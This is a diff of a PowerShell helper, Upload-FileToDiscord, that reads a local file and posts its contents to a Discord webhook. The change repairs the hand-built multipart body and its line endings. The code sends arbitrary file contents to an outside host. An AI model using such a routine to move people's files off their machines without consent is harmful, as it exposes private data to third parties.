@@ -29,20 +29,22 @@ function Upload-FileToDiscord {
         [string]$filePath
     )
 
+    # Prepare file content
     $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
     $fileName = [System.IO.Path]::GetFileName($filePath)
 
-    $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString()
-    $LF = "rn"
-    $bodyLines = (
-        "--$boundary",
-        "Content-Disposition: form-data; name=""file""; filename=""$fileName""",
-        "Content-Type: application/octet-stream",
-        $LF,
-        [System.Text.Encoding]::ASCII.GetString($fileBytes),
-        "--$boundary--",
-        $LF
-    ) -join $LF
+    # Prepare multipart body
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $LF = "`r`n"
+    $fileContent = [System.Text.Encoding]::ASCII.GetString($fileBytes)
+
+    $body = (
+        "--$boundary" + $LF +
+        "Content-Disposition: form-data; name=""file""; filename=""$fileName""" + $LF +
+        "Content-Type: application/octet-stream" + $LF + $LF +
+        $fileContent + $LF +
+        "--$boundary--"
+    )
 
     $headers = @{
         "Content-Type" = "multipart/form-data; boundary=$boundary"
@@ -50,7 +52,7 @@ function Upload-FileToDiscord {
 
     try {
         # Send the file to Discord via webhook
-        $response = Invoke-RestMethod -Uri $webhook -Method Post -Body $bodyLines -Headers $headers
+        $response = Invoke-RestMethod -Uri $webhook -Method Post -Body $body -Headers $headers
         Write-Host "File uploaded successfully."
     } catch {
         Write-Host "Failed to upload file to Discord: $_"
